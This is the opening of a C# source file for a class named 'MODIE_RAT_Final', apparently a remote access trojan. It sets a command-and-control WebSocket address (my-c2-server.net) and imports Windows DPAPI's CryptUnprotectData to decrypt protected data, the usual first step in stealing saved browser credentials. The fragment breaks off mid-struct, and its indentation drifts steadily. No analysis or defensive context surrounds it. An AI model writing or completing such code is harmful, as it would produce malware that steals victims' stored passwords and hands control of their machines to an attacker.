using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Net; // Required for a proxy setting in a more advanced scenario.

public class MODIE_RAT_Final
{
    private const string C2_URL = "ws://my-c2-server.net:80"; // WebSocket endpoint
        
            // Windows DPAPI Imports for decryption
                [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
                    private static extern bool CryptUnprotectData(
                            ref DATA_BLOB pCipherText, ref string pszDescription, ref DATA_BLOB pEntropy,
                                    IntPtr pReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPrompt, int dwFlags,
                                            ref DATA_BLOB pPlainText);

                                                [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
                                                    private struct DATA_BLOB
                                                        {
                                                                public int cbData;
                                                                        public IntPtr pbData;
                                                                            }

                                                                                [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
                                                                                    private struct CRYPTPROTECT_PROMPTSTRUCT
                                                                                        {
